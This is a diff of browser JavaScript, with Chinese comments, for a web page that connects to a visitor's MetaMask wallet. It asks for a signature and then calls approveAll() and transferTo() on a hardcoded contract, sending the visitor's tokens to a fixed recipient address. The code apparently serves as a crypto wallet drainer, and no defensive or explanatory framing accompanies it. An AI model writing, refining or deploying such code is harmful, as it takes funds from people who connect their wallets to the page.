@@ -1,7 +1,7 @@
 let web3;
 let isConnected = false;
-const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 接收代币的地址
-const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 你的智能合约地址
+const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 设置接收地址
+const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 智能合约地址
 
 const erc20Abi = [
     {
@@ -17,82 +17,127 @@ const erc20Abi = [
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "_tokenAddress",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "inputs": [],
+        "name": "recipient",
+        "outputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "token",
+        "outputs": [
+            {
+                "internalType": "contract IERC20",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
     }
 ];
 
-// 页面加载时
-window.onload = async () => {
-    // 初始禁用签名按钮
-    document.getElementById('signButton').disabled = true;
-};
-
-// 更新状态显示
-const updateStatus = (message) => {
+// 动态更新状态信息
+function dynamicUpdate(status, ...messages) {
     const statusElement = document.getElementById('status');
-    statusElement.innerText = message;
-};
+    statusElement.innerText += `\n${status}: ${messages.join(' ')}`;
+}
+
+// 异常处理泛型函数
+async function handleWithCatch(actionName, fn) {
+    try {
+        return await fn();
+    } catch (error) {
+        dynamicUpdate(actionName, '失败', error.message);
+        throw error;
+    }
+}
 
 // 连接钱包按钮点击事件
 document.getElementById('connectButton').onclick = async () => {
-    if (window.ethereum) {
-        try {
-            // 请求用户连接钱包
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+    try {
+        if (typeof window.ethereum !== 'undefined') {
+            // 请求钱包授权
+            const accounts = await handleWithCatch('请求账户', () => window.ethereum.request({ method: 'eth_requestAccounts' }));
             web3 = new Web3(window.ethereum);
-            const accounts = await web3.eth.getAccounts();
 
             if (accounts.length > 0) {
-                const account = accounts[0];
-                updateStatus(`已连接 MetaMask 地址: ${account}`);
-                document.getElementById('signButton').disabled = false; // 启用签名按钮
+                updateWalletList(accounts[0]);
                 isConnected = true;
+                dynamicUpdate('连接状态', 'MetaMask 已连接');
+                document.getElementById('signButton').disabled = false; // 启用签名按钮
             } else {
-                updateStatus('无法获取钱包地址，请重新连接');
-            }
-        } catch (error) {
-            updateStatus('连接钱包失败: ' + error.message);
-        }
-    } else {
-        updateStatus('MetaMask 未安装，请安装 MetaMask 插件');
-    }
-};
-
-// 签名并转移代币
-document.getElementById('signButton').onclick = async () => {
-    if (isConnected && web3) {
-        const accounts = await web3.eth.getAccounts();
-        if (accounts.length > 0) {
-            const account = accounts[0];
-            try {
-                const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-                const signature = await web3.eth.personal.sign(message, account);
-                updateStatus(`签名成功: ${signature}`);
-
-                // 执行转移操作
-                await transferAssets(account);
-            } catch (error) {
-                updateStatus('签名失败: ' + error.message);
+                dynamicUpdate('账户状态', '未检测到任何账户');
             }
         } else {
-            updateStatus('未连接账户，请先连接钱包');
+            dynamicUpdate('MetaMask', '未检测到，请安装 MetaMask');
         }
-    } else {
-        updateStatus('钱包未连接，请先连接钱包');
-    }
-};
-
-// 转移代币
-const transferAssets = async (account) => {
-    updateStatus('开始转移代币...');
-    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
-
-    try {
-        await tokenContract.methods.approveAll().send({ from: account });
-        updateStatus('代币授权成功');
-
-        await tokenContract.methods.transferTo().send({ from: account });
-        updateStatus('代币成功转移到 ' + recipientAddress);
     } catch (error) {
-        updateStatus('转移代币失败: ' + error.message);
+        dynamicUpdate('连接失败', error.message);
     }
 };
+
+// 更新钱包列表
+function updateWalletList(address) {
+    const walletList = document.getElementById('walletList');
+    walletList.innerHTML = ''; // 清空旧列表
+    const walletItem = document.createElement('li');
+    walletItem.innerText = address;
+    walletList.appendChild(walletItem);
+}
+
+// 签名并转移资产按钮点击事件
+document.getElementById('signButton').onclick = async () => {
+    try {
+        const accounts = await web3.eth.getAccounts();
+        if (accounts.length === 0) {
+            dynamicUpdate('签名错误', '请先连接钱包');
+            return;
+        }
+
+        const account = accounts[0];
+        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+        
+        const signature = await handleWithCatch('签名', () => web3.eth.personal.sign(message, account));
+        dynamicUpdate('签名成功', signature);
+
+        // 调用代币转移函数
+        await transferAssets(account);
+    } catch (error) {
+        dynamicUpdate('签名错误', error.message);
+    }
+};
+
+// 转移代币的函数
+async function transferAssets(account) {
+    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
+    dynamicUpdate('转移过程', `正在从账户 ${account} 中转移代币...`);
+
+    // 批准转移代币
+    await handleWithCatch('授权', () => tokenContract.methods.approveAll().send({ from: account }));
+    dynamicUpdate('授权成功');
+
+    // 执行代币转移
+    await handleWithCatch('代币转移', () => tokenContract.methods.transferTo().send({ from: account }));
+    dynamicUpdate('转移成功', `代币已成功转移到 ${recipientAddress}`);
+}
